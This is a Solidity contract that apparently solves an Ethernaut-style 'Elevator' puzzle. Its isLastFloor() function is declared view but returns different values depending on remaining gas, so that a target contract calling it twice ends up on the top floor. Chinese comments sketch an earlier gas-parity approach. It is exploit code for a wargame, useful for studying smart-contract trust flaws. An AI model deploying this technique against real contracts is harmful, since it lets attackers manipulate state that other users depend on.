// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'hardhat/console.sol';
interface Elevator {
  function  goTo() external returns (bool);
}


contract Building {
    bool public top;
  
    Elevator ele;
    

    function initElev(address add) public{

        ele=Elevator(add);

    }
    function attackGO() public returns (bool what){

              what = ele.goTo();

    }
    
    function isLastFloor() public view returns (bool){
            //使用奇偶判断 需要调试debug gas的剩余量
            // uint256  gas = gasleft();
            // console.log(gas);
            // uint256 result = gas % 2;
            
            // console.log(result);
            // bool a =  result == 1 ? false:true;
            // return a; //使用奇偶

            // 使用gas 循环消耗 调用
            //console.log(gasleft());
            uint256 x=1;
            if(gasleft()>1000){

              do{                
                  //x= a*10;
                  uint256 aa=address(this).balance;
                  //console.log(gasleft());
              }while(gasleft()>1000);
              
              return false;
            }

            return true;

    }


}